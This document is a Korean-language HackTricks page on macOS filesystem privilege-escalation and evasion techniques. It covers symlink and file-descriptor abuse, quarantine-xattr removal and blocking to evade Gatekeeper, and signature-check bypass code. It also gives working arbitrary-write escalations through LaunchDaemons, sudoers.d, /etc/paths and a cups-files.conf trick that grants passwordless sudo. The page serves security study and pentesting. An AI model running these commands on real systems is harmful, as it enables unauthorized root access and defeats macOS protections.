# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX 권한 조합

**디렉토리**의 권한:

- **읽기** - 디렉토리 항목을 **열거**할 수 있습니다.
- **쓰기** - 디렉토리 내의 **파일**을 **삭제/작성**할 수 있으며, **빈 폴더**를 **삭제**할 수 있습니다.
- 그러나 **쓰기 권한**이 없으면 **비어 있지 않은 폴더**를 **삭제/수정**할 수 없습니다.
- **폴더의 이름을 수정**할 수 없으며, 소유자가 아니면 수정할 수 없습니다.
- **실행** - 디렉토리를 **탐색**할 수 있습니다. 이 권한이 없으면 내부의 파일이나 하위 디렉토리에 접근할 수 없습니다.

### 위험한 조합

**루트가 소유한 파일/폴더를 덮어쓰는 방법**, 그러나:

- 경로의 부모 **디렉토리 소유자**가 사용자입니다.
- 경로의 부모 **디렉토리 소유자**가 **쓰기 권한**이 있는 **사용자 그룹**입니다.
- 사용자 **그룹**이 **파일**에 **쓰기** 권한을 가지고 있습니다.

이전 조합 중 하나로 공격자는 **특권 임의 쓰기**를 얻기 위해 예상 경로에 **심볼릭/하드 링크**를 **주입**할 수 있습니다.

### 폴더 루트 R+X 특별 사례

**루트만 R+X 접근 권한**이 있는 **디렉토리**에 파일이 있는 경우, 그 파일은 **다른 누구도 접근할 수 없습니다**. 따라서 **제한**으로 인해 사용자가 읽을 수 없는 **읽기 가능한 파일**을 이 폴더에서 **다른 폴더로 이동**할 수 있는 취약점이 있다면, 이를 악용하여 이러한 파일을 읽을 수 있습니다.

예시: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## 심볼릭 링크 / 하드 링크

### 관대한 파일/폴더

특권 프로세스가 **하위 특권 사용자**에 의해 **제어**될 수 있는 **파일**에 데이터를 쓰고 있거나, 하위 특권 사용자에 의해 **이전에 생성된** 경우, 사용자는 심볼릭 또는 하드 링크를 통해 **다른 파일**을 가리킬 수 있으며, 특권 프로세스는 해당 파일에 쓰게 됩니다.

공격자가 **임의 쓰기를 악용하여 권한을 상승**시킬 수 있는 다른 섹션을 확인하십시오.

### Open `O_NOFOLLOW`

`open` 함수에서 사용되는 플래그 `O_NOFOLLOW`는 마지막 경로 구성 요소에서 심볼릭 링크를 따르지 않지만, 나머지 경로는 따릅니다. 경로에서 심볼릭 링크를 따르지 않도록 방지하는 올바른 방법은 `O_NOFOLLOW_ANY` 플래그를 사용하는 것입니다.

## .fileloc

**`.fileloc`** 확장자를 가진 파일은 다른 애플리케이션이나 바이너리를 가리킬 수 있으므로, 열릴 때 애플리케이션/바이너리가 실행됩니다.\
예시:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 파일 설명자

### FD 누수 (no `O_CLOEXEC`)

`open` 호출에 `O_CLOEXEC` 플래그가 없으면 파일 설명자가 자식 프로세스에 의해 상속됩니다. 따라서, 권한이 있는 프로세스가 권한이 있는 파일을 열고 공격자가 제어하는 프로세스를 실행하면, 공격자는 **권한이 있는 파일에 대한 FD를 상속받게 됩니다**.

**높은 권한으로 파일이나 폴더를 열도록 프로세스를 만들 수 있다면**, **`crontab`**를 악용하여 **`EDITOR=exploit.py`**로 `/etc/sudoers.d`에 있는 파일을 열 수 있습니다. 그러면 `exploit.py`는 `/etc/sudoers` 내부의 파일에 대한 FD를 얻고 이를 악용할 수 있습니다.

예를 들어: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), 코드: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## 격리 xattrs 트릭 피하기

### 제거하기
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 플래그

파일/폴더에 이 불변 속성이 설정되어 있으면 xattr를 추가할 수 없습니다.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

**devfs** 마운트는 **xattr**를 지원하지 않습니다. 자세한 내용은 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)를 참조하세요.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 ACE를 포함하여 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 **`com.apple.acl.text`**라는 xattr에 저장된 ACL 텍스트 표현이 압축 해제된 파일의 ACL로 설정될 것임을 확인할 수 있습니다. 따라서, ACL이 다른 xattrs가 작성되는 것을 방지하는 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축했다면... 애플리케이션에 격리 xattr가 설정되지 않았습니다:

자세한 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.

이를 복제하기 위해 먼저 올바른 acl 문자열을 가져와야 합니다:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(작동하더라도 샌드박스는 먼저 격리 xattr를 작성합니다)

정확히 필요하지는 않지만 혹시 모르니 남겨둡니다:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## 서명 검사 우회

### 플랫폼 바이너리 검사 우회

일부 보안 검사는 바이너리가 **플랫폼 바이너리**인지 확인하여 XPC 서비스에 연결할 수 있도록 합니다. 그러나 https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/에서 설명된 바와 같이, 플랫폼 바이너리(예: /bin/ls)를 가져와서 `DYLD_INSERT_LIBRARIES` 환경 변수를 사용하여 dyld를 통해 익스플로잇을 주입함으로써 이 검사를 우회할 수 있습니다.

### 플래그 `CS_REQUIRE_LV` 및 `CS_FORCED_LV` 우회

실행 중인 바이너리가 자신의 플래그를 수정하여 다음과 같은 코드로 검사를 우회할 수 있습니다:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## 코드 서명 우회

번들에는 **`_CodeSignature/CodeResources`** 파일이 포함되어 있으며, 이 파일에는 **번들** 내의 모든 **파일**의 **해시**가 포함되어 있습니다. CodeResources의 해시도 **실행 파일**에 **내장**되어 있으므로, 우리는 그것을 건드릴 수 없습니다.

그러나 서명이 확인되지 않는 일부 파일이 있으며, 이러한 파일은 plist에서 omit 키를 가지고 있습니다.
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI에서 리소스의 서명을 계산하는 것은 다음과 같이 가능합니다:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

사용자는 기존 폴더 위에 생성된 사용자 정의 dmg를 마운트할 수 있습니다. 이렇게 하면 사용자 정의 콘텐츠가 포함된 사용자 정의 dmg 패키지를 생성할 수 있습니다:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
보통 macOS는 `/usr/libexec/diskarbitrationd`에서 제공하는 `com.apple.DiskArbitrarion.diskarbitrariond` Mach 서비스와 통신하여 디스크를 마운트합니다. LaunchDaemons plist 파일에 `-d` 매개변수를 추가하고 재시작하면 `/var/log/diskarbitrationd.log`에 로그를 저장합니다.\
그러나 `hdik` 및 `hdiutil`과 같은 도구를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신하는 것이 가능합니다.

## 임의 쓰기

### 주기적인 sh 스크립트

스크립트가 **셸 스크립트**로 해석될 수 있다면, 매일 트리거되는 **`/etc/periodic/daily/999.local`** 셸 스크립트를 덮어쓸 수 있습니다.

다음과 같이 이 스크립트의 실행을 **가짜로** 만들 수 있습니다: **`sudo periodic daily`**

### 데몬

임의의 **LaunchDaemon**을 작성하여 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 plist를 사용하여 임의의 스크립트를 실행하도록 합니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` 파일을 생성하고 **루트**로 실행하고 싶은 **명령어**를 입력하세요.

### Sudoers 파일

**임의 쓰기** 권한이 있다면, **`/etc/sudoers.d/`** 폴더 안에 파일을 생성하여 **sudo** 권한을 부여할 수 있습니다.

### PATH 파일

**`/etc/paths`** 파일은 PATH env 변수를 채우는 주요 장소 중 하나입니다. 이를 덮어쓰려면 루트 권한이 필요하지만, **특권 프로세스**의 스크립트가 **전체 경로 없이** 어떤 **명령어**를 실행하고 있다면, 이 파일을 수정하여 **하이재킹**할 수 있습니다.

또한 **`/etc/paths.d`**에 파일을 작성하여 `PATH` env 변수에 새로운 폴더를 추가할 수 있습니다.

### cups-files.conf

이 기술은 [이 글](https://www.kandji.io/blog/macos-audit-story-part1)에서 사용되었습니다.

다음 내용을 포함하여 `/etc/cups/cups-files.conf` 파일을 생성하세요:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
이것은 `/etc/sudoers.d/lpe` 파일을 777 권한으로 생성합니다. 끝에 있는 추가 쓰레기는 오류 로그 생성을 트리거하기 위한 것입니다.

그런 다음, `/etc/sudoers.d/lpe`에 `%staff ALL=(ALL) NOPASSWD:ALL`과 같은 권한 상승에 필요한 구성을 작성합니다.

그런 다음, `/etc/cups/cups-files.conf` 파일을 다시 수정하여 `LogFilePerm 700`을 지정하여 새로운 sudoers 파일이 `cupsctl`을 호출할 때 유효해지도록 합니다.

### 샌드박스 탈출

FS 임의 쓰기를 통해 macOS 샌드박스를 탈출하는 것이 가능합니다. 몇 가지 예시는 [macOS Auto Start](../../../../macos-auto-start-locations.md) 페이지를 확인하세요. 그러나 일반적인 방법은 `~/Library/Preferences/com.apple.Terminal.plist`에 터미널 환경설정 파일을 작성하여 시작 시 명령을 실행하고 `open`을 사용하여 호출하는 것입니다.

## 다른 사용자로서 쓰기 가능한 파일 생성

이것은 내가 쓸 수 있는 루트 소유의 파일을 생성합니다 ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). 이것은 권한 상승으로도 작동할 수 있습니다:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX 공유 메모리

**POSIX 공유 메모리**는 POSIX 호환 운영 체제에서 프로세스가 공통 메모리 영역에 접근할 수 있도록 하여 다른 프로세스 간 통신 방법에 비해 더 빠른 통신을 가능하게 합니다. 이는 `shm_open()`을 사용하여 공유 메모리 객체를 생성하거나 열고, `ftruncate()`로 크기를 설정하며, `mmap()`을 사용하여 프로세스의 주소 공간에 매핑하는 과정을 포함합니다. 프로세스는 이 메모리 영역에서 직접 읽고 쓸 수 있습니다. 동시 접근을 관리하고 데이터 손상을 방지하기 위해 뮤텍스나 세마포와 같은 동기화 메커니즘이 자주 사용됩니다. 마지막으로, 프로세스는 `munmap()`과 `close()`를 사용하여 공유 메모리를 언매핑하고 닫으며, 선택적으로 `shm_unlink()`로 메모리 객체를 제거할 수 있습니다. 이 시스템은 여러 프로세스가 공유 데이터에 빠르게 접근해야 하는 환경에서 효율적이고 빠른 IPC를 위해 특히 효과적입니다.

<details>

<summary>생산자 코드 예제</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>소비자 코드 예제</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS 보호된 설명자

**macOS 보호된 설명자**는 사용자 애플리케이션에서 **파일 설명자 작업**의 안전성과 신뢰성을 향상시키기 위해 macOS에 도입된 보안 기능입니다. 이러한 보호된 설명자는 파일 설명자와 특정 제한 또는 "가드"를 연결하는 방법을 제공하며, 이는 커널에 의해 시행됩니다.

이 기능은 **무단 파일 접근** 또는 **경쟁 조건**과 같은 특정 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어, 스레드가 파일 설명서에 접근할 때 **다른 취약한 스레드가 그에 대한 접근을 허용하는 경우** 또는 파일 설명자가 **취약한 자식 프로세스에 의해 상속되는 경우** 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다:

- `guarded_open_np`: 가드와 함께 FD를 엽니다
- `guarded_close_np`: 닫습니다
- `change_fdguard_np`: 설명자의 가드 플래그를 변경합니다 (가드 보호를 제거하는 것도 포함)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
